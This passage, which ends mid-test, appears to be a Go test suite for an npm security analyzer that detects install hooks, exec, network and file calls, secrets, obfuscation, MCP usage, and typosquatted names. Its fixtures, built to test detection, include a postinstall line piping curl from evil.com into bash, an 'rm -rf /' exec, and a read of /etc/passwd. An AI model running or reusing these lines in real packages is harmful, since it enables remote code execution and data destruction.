package npm

import (
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// --- ParsePackageJSON ---

func TestParsePackageJSON(t *testing.T) {
	tests := []struct {
		name    string
		content string
		want    func(t *testing.T, pkg *PackageJSON)
		wantErr bool
	}{
		{
			name: "valid full package",
			content: `{
				"name": "my-pkg",
				"version": "1.2.3",
				"description": "A test package",
				"main": "index.js",
				"type": "module",
				"private": true,
				"scripts": {"test": "jest", "postinstall": "node setup.js"},
				"dependencies": {"express": "^4.18.0", "lodash": "^4.17.21"},
				"devDependencies": {"jest": "^29.0.0"},
				"license": "MIT"
			}`,
			want: func(t *testing.T, pkg *PackageJSON) {
				t.Helper()
				if pkg.Name != "my-pkg" {
					t.Errorf("Name = %q, want %q", pkg.Name, "my-pkg")
				}
				if pkg.Version != "1.2.3" {
					t.Errorf("Version = %q, want %q", pkg.Version, "1.2.3")
				}
				if pkg.Description != "A test package" {
					t.Errorf("Description = %q, want %q", pkg.Description, "A test package")
				}
				if pkg.Main != "index.js" {
					t.Errorf("Main = %q, want %q", pkg.Main, "index.js")
				}
				if pkg.Type != "module" {
					t.Errorf("Type = %q, want %q", pkg.Type, "module")
				}
				if !pkg.Private {
					t.Error("Private = false, want true")
				}
				if len(pkg.Scripts) != 2 {
					t.Errorf("Scripts count = %d, want 2", len(pkg.Scripts))
				}
				if len(pkg.Dependencies) != 2 {
					t.Errorf("Dependencies count = %d, want 2", len(pkg.Dependencies))
				}
				if len(pkg.DevDependencies) != 1 {
					t.Errorf("DevDependencies count = %d, want 1", len(pkg.DevDependencies))
				}
			},
		},
		{
			name:    "minimal package",
			content: `{"name": "minimal", "version": "0.0.1"}`,
			want: func(t *testing.T, pkg *PackageJSON) {
				t.Helper()
				if pkg.Name != "minimal" {
					t.Errorf("Name = %q, want %q", pkg.Name, "minimal")
				}
				if pkg.Version != "0.0.1" {
					t.Errorf("Version = %q, want %q", pkg.Version, "0.0.1")
				}
				if len(pkg.Dependencies) != 0 {
					t.Errorf("Dependencies count = %d, want 0", len(pkg.Dependencies))
				}
			},
		},
		{
			name:    "empty JSON object",
			content: `{}`,
			want: func(t *testing.T, pkg *PackageJSON) {
				t.Helper()
				if pkg.Name != "" {
					t.Errorf("Name = %q, want empty", pkg.Name)
				}
			},
		},
		{
			name:    "malformed JSON",
			content: `{invalid json!!!}`,
			wantErr: true,
		},
		{
			name:    "empty file",
			content: ``,
			wantErr: true,
		},
		{
			name:    "file not found",
			content: "", // special: we won't write a file
			wantErr: true,
		},
		{
			name: "bin as string",
			content: `{
				"name": "my-cli",
				"version": "1.0.0",
				"bin": "./cli.js"
			}`,
			want: func(t *testing.T, pkg *PackageJSON) {
				t.Helper()
				entries := pkg.BinEntries()
				if len(entries) != 1 {
					t.Fatalf("BinEntries count = %d, want 1", len(entries))
				}
				if entries["my-cli"] != "./cli.js" {
					t.Errorf("BinEntries[my-cli] = %q, want %q", entries["my-cli"], "./cli.js")
				}
			},
		},
		{
			name: "bin as map",
			content: `{
				"name": "multi-cli",
				"version": "1.0.0",
				"bin": {"cmd1": "./a.js", "cmd2": "./b.js"}
			}`,
			want: func(t *testing.T, pkg *PackageJSON) {
				t.Helper()
				entries := pkg.BinEntries()
				if len(entries) != 2 {
					t.Fatalf("BinEntries count = %d, want 2", len(entries))
				}
				if entries["cmd1"] != "./a.js" {
					t.Errorf("BinEntries[cmd1] = %q, want %q", entries["cmd1"], "./a.js")
				}
			},
		},
		{
			name:    "bin nil",
			content: `{"name": "no-bin", "version": "1.0.0"}`,
			want: func(t *testing.T, pkg *PackageJSON) {
				t.Helper()
				if entries := pkg.BinEntries(); entries != nil {
					t.Errorf("BinEntries = %v, want nil", entries)
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.name == "file not found" {
				_, err := ParsePackageJSON("/nonexistent/package.json")
				if err == nil {
					t.Fatal("expected error for nonexistent file, got nil")
				}
				return
			}

			dir := t.TempDir()
			path := filepath.Join(dir, "package.json")
			if err := os.WriteFile(path, []byte(tt.content), 0o644); err != nil {
				t.Fatal(err)
			}

			pkg, err := ParsePackageJSON(path)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if tt.want != nil {
				tt.want(t, pkg)
			}
		})
	}
}

// --- ParseLockfile ---

func TestParseLockfile(t *testing.T) {
	tests := []struct {
		name    string
		content string
		want    func(t *testing.T, r *LockfileResult)
		wantErr bool
	}{
		{
			name: "v1 lockfile",
			content: `{
				"name": "my-app",
				"version": "1.0.0",
				"lockfileVersion": 1,
				"dependencies": {
					"express": {
						"version": "4.18.2",
						"resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
						"integrity": "sha512-abc",
						"dependencies": {
							"body-parser": {
								"version": "1.20.1",
								"resolved": "https://registry.npmjs.org/body-parser/-/body-parser-1.20.1.tgz",
								"integrity": "sha512-def"
							}
						}
					},
					"lodash": {
						"version": "4.17.21",
						"resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
						"dev": true
					}
				}
			}`,
			want: func(t *testing.T, r *LockfileResult) {
				t.Helper()
				if r.LockVersion != 1 {
					t.Errorf("LockVersion = %d, want 1", r.LockVersion)
				}
				if r.Name != "my-app" {
					t.Errorf("Name = %q, want %q", r.Name, "my-app")
				}
				if r.TotalDeps != 3 {
					t.Errorf("TotalDeps = %d, want 3", r.TotalDeps)
				}
				if r.DirectDeps != 2 {
					t.Errorf("DirectDeps = %d, want 2", r.DirectDeps)
				}
				if r.TransDeps != 1 {
					t.Errorf("TransDeps = %d, want 1", r.TransDeps)
				}
				if r.MaxDepth != 2 {
					t.Errorf("MaxDepth = %d, want 2", r.MaxDepth)
				}
			},
		},
		{
			name: "v2 lockfile",
			content: `{
				"name": "my-app",
				"version": "2.0.0",
				"lockfileVersion": 2,
				"packages": {
					"": {"name": "my-app", "version": "2.0.0"},
					"node_modules/express": {
						"version": "4.18.2",
						"resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
						"integrity": "sha512-abc"
					},
					"node_modules/express/node_modules/qs": {
						"version": "6.11.0",
						"resolved": "https://registry.npmjs.org/qs/-/qs-6.11.0.tgz"
					}
				}
			}`,
			want: func(t *testing.T, r *LockfileResult) {
				t.Helper()
				if r.LockVersion != 2 {
					t.Errorf("LockVersion = %d, want 2", r.LockVersion)
				}
				if r.TotalDeps != 2 {
					t.Errorf("TotalDeps = %d, want 2", r.TotalDeps)
				}
				if r.DirectDeps != 1 {
					t.Errorf("DirectDeps = %d, want 1", r.DirectDeps)
				}
				if r.TransDeps != 1 {
					t.Errorf("TransDeps = %d, want 1", r.TransDeps)
				}
				if r.MaxDepth != 2 {
					t.Errorf("MaxDepth = %d, want 2", r.MaxDepth)
				}
			},
		},
		{
			name: "v3 lockfile with scoped package",
			content: `{
				"name": "my-app",
				"version": "3.0.0",
				"lockfileVersion": 3,
				"packages": {
					"": {"name": "my-app", "version": "3.0.0"},
					"node_modules/@types/node": {
						"version": "20.0.0",
						"resolved": "https://registry.npmjs.org/@types/node/-/node-20.0.0.tgz",
						"dev": true
					},
					"node_modules/@scope/pkg": {
						"version": "1.0.0"
					}
				}
			}`,
			want: func(t *testing.T, r *LockfileResult) {
				t.Helper()
				if r.LockVersion != 3 {
					t.Errorf("LockVersion = %d, want 3", r.LockVersion)
				}
				if r.TotalDeps != 2 {
					t.Errorf("TotalDeps = %d, want 2", r.TotalDeps)
				}
				// Check scoped package name was parsed correctly
				found := false
				for _, dep := range r.Dependencies {
					if dep.Name == "@types/node" {
						found = true
						if !dep.Dev {
							t.Error("@types/node should be dev dependency")
						}
					}
				}
				if !found {
					t.Error("did not find @types/node in dependencies")
				}
			},
		},
		{
			name: "lockfile with duplicates",
			content: `{
				"name": "dup-app",
				"version": "1.0.0",
				"lockfileVersion": 2,
				"packages": {
					"": {"name": "dup-app", "version": "1.0.0"},
					"node_modules/qs": {
						"version": "6.11.0"
					},
					"node_modules/express/node_modules/qs": {
						"version": "6.10.0"
					}
				}
			}`,
			want: func(t *testing.T, r *LockfileResult) {
				t.Helper()
				if r.Duplicates != 1 {
					t.Errorf("Duplicates = %d, want 1", r.Duplicates)
				}
			},
		},
		{
			name:    "empty lockfile",
			content: `{}`,
			want: func(t *testing.T, r *LockfileResult) {
				t.Helper()
				if r.TotalDeps != 0 {
					t.Errorf("TotalDeps = %d, want 0", r.TotalDeps)
				}
				// Should infer v1 when no packages or dependencies
				if r.LockVersion != 1 {
					t.Errorf("LockVersion = %d, want 1 (inferred)", r.LockVersion)
				}
			},
		},
		{
			name:    "malformed JSON lockfile",
			content: `not json at all`,
			wantErr: true,
		},
		{
			name:    "file not found",
			content: "",
			wantErr: true,
		},
		{
			name: "infer v2 when lockfileVersion missing but packages present",
			content: `{
				"name": "inferred",
				"version": "1.0.0",
				"packages": {
					"": {},
					"node_modules/chalk": {"version": "5.0.0"}
				}
			}`,
			want: func(t *testing.T, r *LockfileResult) {
				t.Helper()
				if r.LockVersion != 2 {
					t.Errorf("LockVersion = %d, want 2 (inferred)", r.LockVersion)
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.name == "file not found" {
				_, err := ParseLockfile("/nonexistent/package-lock.json")
				if err == nil {
					t.Fatal("expected error for nonexistent file, got nil")
				}
				return
			}

			dir := t.TempDir()
			path := filepath.Join(dir, "package-lock.json")
			if err := os.WriteFile(path, []byte(tt.content), 0o644); err != nil {
				t.Fatal(err)
			}

			result, err := ParseLockfile(path)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if tt.want != nil {
				tt.want(t, result)
			}
		})
	}
}

// --- splitNodeModulesPath ---

func TestSplitNodeModulesPath(t *testing.T) {
	tests := []struct {
		key  string
		want []string
	}{
		{"node_modules/express", []string{"express"}},
		{"node_modules/express/node_modules/qs", []string{"express", "qs"}},
		{"node_modules/@scope/pkg", []string{"@scope/pkg"}},
		{"node_modules/@scope/pkg/node_modules/dep", []string{"@scope/pkg", "dep"}},
		{"", nil},
		{"random/path", nil},
		{"node_modules", nil}, // trailing node_modules with nothing after
	}

	for _, tt := range tests {
		t.Run(tt.key, func(t *testing.T) {
			got := splitNodeModulesPath(tt.key)
			if len(got) != len(tt.want) {
				t.Fatalf("splitNodeModulesPath(%q) = %v, want %v", tt.key, got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("segment[%d] = %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

// --- Analyze ---

func TestAnalyze(t *testing.T) {
	tests := []struct {
		name    string
		pkgJSON string
		jsFiles map[string]string // filename -> content
		want    func(t *testing.T, r *AnalysisResult)
		wantErr bool
	}{
		{
			name: "basic package with network and exec calls",
			pkgJSON: `{
				"name": "test-pkg",
				"version": "1.0.0",
				"scripts": {"start": "node index.js"},
				"dependencies": {"express": "^4.0.0"}
			}`,
			jsFiles: map[string]string{
				"index.js": `
const http = require('http');
const { exec } = require('child_process');
fetch("https://example.com/api");
fs.readFile("/etc/passwd", "utf8", (err, data) => {});
`,
			},
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if r.PackageName != "test-pkg" {
					t.Errorf("PackageName = %q, want %q", r.PackageName, "test-pkg")
				}
				if r.Dependencies != 1 {
					t.Errorf("Dependencies = %d, want 1", r.Dependencies)
				}
				if len(r.NetworkCalls) == 0 {
					t.Error("expected network calls to be detected")
				}
				if len(r.ExecCalls) == 0 {
					t.Error("expected exec calls to be detected")
				}
				if len(r.FSAccess) == 0 {
					t.Error("expected FS access to be detected")
				}
				if r.RiskScore == 0 {
					t.Error("expected non-zero risk score")
				}
			},
		},
		{
			name: "package with postinstall hook",
			pkgJSON: `{
				"name": "hook-pkg",
				"version": "0.1.0",
				"scripts": {"postinstall": "node setup.js", "preinstall": "echo hello"}
			}`,
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if !r.HasPostInstall {
					t.Error("expected HasPostInstall = true")
				}
				if len(r.InstallScripts) != 2 {
					t.Errorf("InstallScripts count = %d, want 2", len(r.InstallScripts))
				}
			},
		},
		{
			name: "package with secrets and obfuscation",
			pkgJSON: `{
				"name": "secret-pkg",
				"version": "1.0.0"
			}`,
			jsFiles: map[string]string{
				"config.js": `
const config = {
	'API_KEY': "sk_live_12345",
	'SECRET': "my-secret-value"
};
eval("some code");
var _0x4a2b = ["hello"];
`,
			},
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if len(r.Secrets) == 0 {
					t.Error("expected secrets to be detected")
				}
				if len(r.ObfuscationIndicators) == 0 {
					t.Error("expected obfuscation indicators")
				}
			},
		},
		{
			name: "package with MCP patterns",
			pkgJSON: `{
				"name": "mcp-server",
				"version": "1.0.0",
				"dependencies": {"@modelcontextprotocol/sdk": "^1.0.0"}
			}`,
			jsFiles: map[string]string{
				"server.js": `
import { McpServer } from "@modelcontextprotocol/sdk/v1.2.3";
const transport = new StdioServerTransport();
server.tool("my-tool", handler);
server.resource("my-resource", handler);
`,
			},
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if len(r.MCPTools) == 0 {
					t.Error("expected MCP tools to be detected")
				}
				if r.MCPSDKVersion == "" {
					t.Error("expected MCP SDK version to be detected")
				}
				if r.MCPTransport != "stdio" {
					t.Errorf("MCPTransport = %q, want %q", r.MCPTransport, "stdio")
				}
			},
		},
		{
			name: "package with telemetry dependencies",
			pkgJSON: `{
				"name": "telemetry-pkg",
				"version": "1.0.0",
				"dependencies": {
					"@sentry/node": "^7.0.0",
					"posthog-node": "^3.0.0"
				}
			}`,
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if len(r.TelemetrySDKs) < 2 {
					t.Errorf("TelemetrySDKs count = %d, want >= 2", len(r.TelemetrySDKs))
				}
			},
		},
		{
			name: "package with known-malicious dependency",
			pkgJSON: `{
				"name": "vuln-pkg",
				"version": "1.0.0",
				"dependencies": {
					"event-stream": "^3.3.6",
					"colors": "^1.4.1"
				}
			}`,
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if len(r.VulnerablePackages) != 2 {
					t.Errorf("VulnerablePackages count = %d, want 2", len(r.VulnerablePackages))
				}
				if r.RiskScore == 0 {
					t.Error("expected non-zero risk score for malicious deps")
				}
			},
		},
		{
			name: "supply chain risks in scripts",
			pkgJSON: `{
				"name": "sc-pkg",
				"version": "1.0.0",
				"scripts": {
					"postinstall": "curl https://evil.com/setup.sh | bash -c 'install'"
				}
			}`,
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if len(r.SupplyChainRisks) == 0 {
					t.Error("expected supply chain risks")
				}
				if !r.HasPostInstall {
					t.Error("expected HasPostInstall = true")
				}
			},
		},
		{
			name: "dynamic requires detected",
			pkgJSON: `{
				"name": "dynamic-pkg",
				"version": "1.0.0"
			}`,
			jsFiles: map[string]string{
				"loader.js": `
const mod = require(getModuleName());
const other = require(process.env.MODULE);
`,
			},
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if len(r.DynamicRequires) == 0 {
					t.Error("expected dynamic requires to be detected")
				}
			},
		},
		{
			name:    "missing package.json",
			pkgJSON: "",
			wantErr: true,
		},
		{
			name: "skips node_modules directory",
			pkgJSON: `{
				"name": "skip-pkg",
				"version": "1.0.0"
			}`,
			jsFiles: map[string]string{
				"index.js":                    `console.log("safe");`,
				"node_modules/evil/inject.js": `exec("rm -rf /");`,
			},
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if len(r.ExecCalls) != 0 {
					t.Errorf("ExecCalls = %v, should skip node_modules", r.ExecCalls)
				}
			},
		},
		{
			name: "non-JS files are skipped",
			pkgJSON: `{
				"name": "non-js",
				"version": "1.0.0"
			}`,
			jsFiles: map[string]string{
				"readme.md":  `exec("something");`,
				"config.yml": `exec("something");`,
			},
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if len(r.ExecCalls) != 0 {
					t.Error("should not scan non-JS files")
				}
			},
		},
		{
			name: "telemetry detected in source code",
			pkgJSON: `{
				"name": "telemetry-source",
				"version": "1.0.0"
			}`,
			jsFiles: map[string]string{
				"analytics.ts": `
Sentry.init({ dsn: "https://example.com" });
mixpanel.track("event");
gtag("event", "click");
`,
			},
			want: func(t *testing.T, r *AnalysisResult) {
				t.Helper()
				if len(r.TelemetrySDKs) < 2 {
					t.Errorf("TelemetrySDKs = %d, want >= 2 from source scanning", len(r.TelemetrySDKs))
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()

			if tt.name == "missing package.json" {
				_, err := Analyze(dir)
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				return
			}

			// Write package.json
			pkgPath := filepath.Join(dir, "package.json")
			if err := os.WriteFile(pkgPath, []byte(tt.pkgJSON), 0o644); err != nil {
				t.Fatal(err)
			}

			// Write JS files
			for name, content := range tt.jsFiles {
				fpath := filepath.Join(dir, name)
				if err := os.MkdirAll(filepath.Dir(fpath), 0o755); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(fpath, []byte(content), 0o644); err != nil {
					t.Fatal(err)
				}
			}

			result, err := Analyze(dir)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if tt.want != nil {
				tt.want(t, result)
			}
		})
	}
}

// --- CheckTyposquatting ---

func TestCheckTyposquatting(t *testing.T) {
	tests := []struct {
		name         string
		pkgName      string
		wantTypo     bool
		wantSimilar  bool
		wantContains string // substring to find in Techniques
	}{
		{
			name:     "exact match - not a typosquat",
			pkgName:  "express",
			wantTypo: false,
		},
		{
			name:         "single char substitution - expresz",
			pkgName:      "expresz",
			wantTypo:     true,
			wantSimilar:  true,
			wantContains: "character-swap",
		},
		{
			name:         "character repetition - expresss",
			pkgName:      "expresss",
			wantTypo:     true,
			wantSimilar:  true,
			wantContains: "character-swap", // levenshtein distance is 1, caught as char-swap
		},
		{
			name:         "scope confusion",
			pkgName:      "@evil/express",
			wantTypo:     true,
			wantSimilar:  true,
			wantContains: "scope-confusion",
		},
		{
			name:         "hyphen variant - lodash vs lo-dash",
			pkgName:      "lo-dash",
			wantTypo:     true,
			wantSimilar:  true,
			wantContains: "missing-hyphen",
		},
		{
			name:        "completely different name",
			pkgName:     "zzz-unique-pkg-name-xyz",
			wantTypo:    false,
			wantSimilar: false,
		},
		{
			name:        "prefix-suffix squatting",
			pkgName:     "express-helper-tool",
			wantSimilar: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := CheckTyposquatting(tt.pkgName)

			if result.Package != tt.pkgName {
				t.Errorf("Package = %q, want %q", result.Package, tt.pkgName)
			}
			if result.IsLikelyTypo != tt.wantTypo {
				t.Errorf("IsLikelyTypo = %v, want %v", result.IsLikelyTypo, tt.wantTypo)
			}
			if tt.wantSimilar && len(result.SimilarTo) == 0 {
				t.Error("expected SimilarTo to be non-empty")
			}
			if !tt.wantSimilar && len(result.SimilarTo) != 0 {
				t.Errorf("expected SimilarTo to be empty, got %v", result.SimilarTo)
			}
			if tt.wantContains != "" {
				found := slices.Contains(result.Techniques, tt.wantContains)
				if !found {
					t.Errorf("Techniques %v does not contain %q", result.Techniques, tt.wantContains)
				}
			}
		})
	}
}

// --- levenshtein ---

func TestLevenshtein(t *testing.T) {
	tests := []struct {
		a, b string
		want int
	}{
		{"", "", 0},
		{"abc", "", 3},
		{"", "abc", 3},
		{"abc", "abc", 0},
		{"abc", "abd", 1},
		{"kitten", "sitting", 3},
		{"express", "expresz", 1},
		{"express", "expresss", 1},
		{"lodash", "lodash", 0},
	}

	for _, tt := range tests {
		t.Run(tt.a+"_"+tt.b, func(t *testing.T) {
			got := levenshtein(tt.a, tt.b)
			if got != tt.want {
				t.Errorf("levenshtein(%q, %q) = %d, want %d", tt.a, tt.b, got, tt.want)
			}
		})
	}
}

// --- levenshteinClose ---

func TestLevenshteinClose(t *testing.T) {
	tests := []struct {
		a, b string
		want bool
	}{
		{"express", "expresz", true},  // single substitution
		{"express", "expres", true},   // single deletion
		{"express", "expresss", true}, // single insertion
		{"express", "express", false}, // identical
		{"express", "abc", false},     // too different
		{"ab", "abcd", false},         // diff > 1 in length
		{"abc", "axc", true},          // single substitution in middle
	}

	for _, tt := range tests {
		t.Run(tt.a+"_"+tt.b, func(t *testing.T) {
			got := levenshteinClose(tt.a, tt.b)
			if got != tt.want {
				t.Errorf("levenshteinClose(%q, %q) = %v, want %v", tt.a, tt.b, got, tt.want)
			}
		})
	}
}

// --- Helper functions ---

func TestStripScope(t *testing.T) {
	tests := []struct {
		input, want string
	}{
		{"@scope/pkg", "pkg"},
		{"@types/node", "node"},
		{"express", "express"},
		{"@scope", "@scope"}, // no slash
		{"", ""},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := stripScope(tt.input)
			if got != tt.want {
				t.Errorf("stripScope(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestHasNonASCII(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{"express", false},
		{"expr\u00e9ss", true}, // accented e
		{"", false},
		{"a-b_c.d", false},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := hasNonASCII(tt.input)
			if got != tt.want {
				t.Errorf("hasNonASCII(%q) = %v, want %v", tt.input, got, tt.want)
			}
		})
	}
}

func TestCheckHyphenVariant(t *testing.T) {
	tests := []struct {
		a, b string
		want bool
	}{
		{"lodash", "lo-dash", true},
		{"fsextra", "fs-extra", true},
		{"express", "express", false}, // same string
		{"abc", "def", false},
	}

	for _, tt := range tests {
		t.Run(tt.a+"_"+tt.b, func(t *testing.T) {
			got := checkHyphenVariant(tt.a, tt.b)
			if got != tt.want {
				t.Errorf("checkHyphenVariant(%q, %q) = %v, want %v", tt.a, tt.b, got, tt.want)
			}
		})
	}
}

func TestCheckRepetition(t *testing.T) {
	tests := []struct {
		candidate, target string
		want              bool
	}{
		{"expresss", "express", true}, // repeated 's'
		{"loddash", "lodash", true},   // repeated 'd'
		{"express", "express", false}, // same length
		{"expr", "express", false},    // shorter
		{"abcdefgh", "abcdefg", true}, // last char 'g' repeated then 'h' — function sees as repetition
	}

	for _, tt := range tests {
		t.Run(tt.candidate+"_"+tt.target, func(t *testing.T) {
			got := checkRepetition(tt.candidate, tt.target)
			if got != tt.want {
				t.Errorf("checkRepetition(%q, %q) = %v, want %v", tt.candidate, tt.target, got, tt.want)
			}
		})
	}
}

func TestTruncateStr(t *testing.T) {
	tests := []struct {
		input  string
		maxLen int
		want   string
	}{
		{"short", 10, "short"},
		{"exactly10!", 10, "exactly10!"},
		{"this is a long string", 10, "this is..."},
		{"abc", 3, "abc"},
		{"abcdef", 5, "ab..."},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := truncateStr(tt.input, tt.maxLen)
			if got != tt.want {
				t.Errorf("truncateStr(%q, %d) = %q, want %q", tt.input, tt.maxLen, got, tt.want)
			}
		})
	}
}

func TestBoolYesNo(t *testing.T) {
	if boolYesNo(true) != "yes" {
		t.Error("boolYesNo(true) should be 'yes'")
	}
	if boolYesNo(false) != "no" {
		t.Error("boolYesNo(false) should be 'no'")
	}
}

// --- GenerateMarkdown ---

func TestGenerateMarkdown(t *testing.T) {
	tests := []struct {
		name   string
		result *AnalysisResult
		checks func(t *testing.T, md string)
	}{
		{
			name: "full report with all sections",
			result: &AnalysisResult{
				PackageName:           "test-pkg",
				Version:               "1.0.0",
				Dependencies:          5,
				HasPostInstall:        true,
				NetworkCalls:          []string{"fetch() (in index.js:10)"},
				ExecCalls:             []string{"exec() (in run.js:5)"},
				Secrets:               []string{"API_KEY (in config.js:3)"},
				MCPTools:              []string{"McpServer (in server.js:1)"},
				ObfuscationIndicators: []string{"eval() dynamic code execution (in main.js:20)"},
				SupplyChainRisks:      []string{"curl in postinstall script"},
				InstallScripts:        map[string]string{"postinstall": "curl https://evil.com"},
				RiskScore:             85,
				RiskFactors:           []string{"has install lifecycle hooks"},
				DeobfuscatedFiles:     2,
			},
			checks: func(t *testing.T, md string) {
				t.Helper()
				mustContain := []string{
					"# npm Security Report: test-pkg@1.0.0",
					"**Risk Score:** 85/100",
					"## Summary",
					"Dependencies: 5",
					"PostInstall hooks: yes",
					"Network calls: 1",
					"Exec calls: 1",
					"Secrets detected: 1",
					"MCP tools: 1",
					"Obfuscation indicators: 1",
					"Supply chain risks: 1",
					"Deobfuscation candidates: 2",
					"## Risk Factors",
					"## Network Calls",
					"## Exec Calls",
					"## Install Scripts",
					"## MCP Tools",
					"## Obfuscation Indicators",
					"## Supply Chain Risks",
				}
				for _, s := range mustContain {
					if !strings.Contains(md, s) {
						t.Errorf("markdown missing %q", s)
					}
				}
			},
		},
		{
			name: "minimal report - no findings",
			result: &AnalysisResult{
				PackageName:  "safe-pkg",
				Version:      "0.1.0",
				Dependencies: 0,
				RiskScore:    0,
			},
			checks: func(t *testing.T, md string) {
				t.Helper()
				if !strings.Contains(md, "safe-pkg@0.1.0") {
					t.Error("missing package name in header")
				}
				if !strings.Contains(md, "Risk Score:** 0/100") {
					t.Error("missing risk score")
				}
				// Should NOT have these sections
				noSections := []string{
					"## Network Calls",
					"## Exec Calls",
					"## MCP Tools",
					"## Obfuscation Indicators",
					"## Supply Chain Risks",
				}
				for _, s := range noSections {
					if strings.Contains(md, s) {
						t.Errorf("should not contain section %q for empty result", s)
					}
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			md := GenerateMarkdown(tt.result)
			if md == "" {
				t.Fatal("GenerateMarkdown returned empty string")
			}
			if tt.checks != nil {
				tt.checks(t, md)
			}
		})
	}
}

// --- GenerateJSON ---

func TestGenerateJSON(t *testing.T) {
	tests := []struct {
		name   string
		result *AnalysisResult
	}{
		{
			name: "full result",
			result: &AnalysisResult{
				PackageName:    "json-pkg",
				Version:        "2.0.0",
				Dependencies:   3,
				HasPostInstall: true,
				NetworkCalls:   []string{"fetch()"},
				ExecCalls:      []string{"exec()"},
				RiskScore:      42,
				RiskFactors:    []string{"network access"},
			},
		},
		{
			name: "empty result",
			result: &AnalysisResult{
				PackageName: "empty",
				Version:     "0.0.0",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			jsonStr, err := GenerateJSON(tt.result)
			if err != nil {
				t.Fatalf("GenerateJSON error: %v", err)
			}
			if jsonStr == "" {
				t.Fatal("GenerateJSON returned empty string")
			}

			// Verify it's valid JSON
			var parsed map[string]any
			if err := json.Unmarshal([]byte(jsonStr), &parsed); err != nil {
				t.Fatalf("output is not valid JSON: %v", err)
			}

			// Check required fields
			if parsed["package_name"] != tt.result.PackageName {
				t.Errorf("package_name = %v, want %q", parsed["package_name"], tt.result.PackageName)
			}
			if parsed["generated"] == nil {
				t.Error("missing 'generated' timestamp field")
			}
		})
	}
}

// --- calculateRisk ---

func TestCalculateRisk(t *testing.T) {
	tests := []struct {
		name      string
		result    *AnalysisResult
		wantMin   int
		wantMax   int
		wantCount int // minimum number of risk factors
	}{
		{
			name:      "zero risk - clean package",
			result:    &AnalysisResult{},
			wantMin:   0,
			wantMax:   0,
			wantCount: 0,
		},
		{
			name: "postinstall adds 25",
			result: &AnalysisResult{
				HasPostInstall: true,
			},
			wantMin:   25,
			wantMax:   25,
			wantCount: 1,
		},
		{
			name: "exec adds 20",
			result: &AnalysisResult{
				ExecCalls: []string{"exec()"},
			},
			wantMin:   20,
			wantMax:   20,
			wantCount: 1,
		},
		{
			name: "network adds 15",
			result: &AnalysisResult{
				NetworkCalls: []string{"fetch()"},
			},
			wantMin:   15,
			wantMax:   15,
			wantCount: 1,
		},
		{
			name: "high deps adds 10",
			result: &AnalysisResult{
				Dependencies: 25,
			},
			wantMin:   10,
			wantMax:   10,
			wantCount: 1,
		},
		{
			name: "moderate deps adds 5",
			result: &AnalysisResult{
				Dependencies: 15,
			},
			wantMin:   5,
			wantMax:   5,
			wantCount: 1,
		},
		{
			name: "capped at 100",
			result: &AnalysisResult{
				HasPostInstall:        true,
				ExecCalls:             []string{"a", "b"},
				NetworkCalls:          []string{"a"},
				FSAccess:              []string{"a"},
				Secrets:               []string{"a"},
				Dependencies:          30,
				ObfuscationIndicators: []string{"a", "b", "c"},
				SupplyChainRisks:      []string{"a", "b", "c"},
				DynamicRequires:       []string{"a", "b", "c"},
				TelemetrySDKs:         []string{"Sentry"},
				VulnerablePackages:    []string{"a", "b"},
				Typosquat:             &TyposquatResult{IsLikelyTypo: true, Techniques: []string{"char-swap"}},
			},
			wantMin:   100,
			wantMax:   100,
			wantCount: 1,
		},
		{
			name: "obfuscation capped at 30",
			result: &AnalysisResult{
				ObfuscationIndicators: []string{"a", "b", "c", "d", "e"},
			},
			wantMin:   30,
			wantMax:   30,
			wantCount: 2, // obfuscation + deobf hint
		},
		{
			name: "typosquat adds 25",
			result: &AnalysisResult{
				Typosquat: &TyposquatResult{
					IsLikelyTypo: true,
					Techniques:   []string{"character-swap"},
				},
			},
			wantMin:   25,
			wantMax:   25,
			wantCount: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			score, factors := calculateRisk(tt.result)
			if score < tt.wantMin || score > tt.wantMax {
				t.Errorf("score = %d, want [%d, %d]", score, tt.wantMin, tt.wantMax)
			}
			if len(factors) < tt.wantCount {
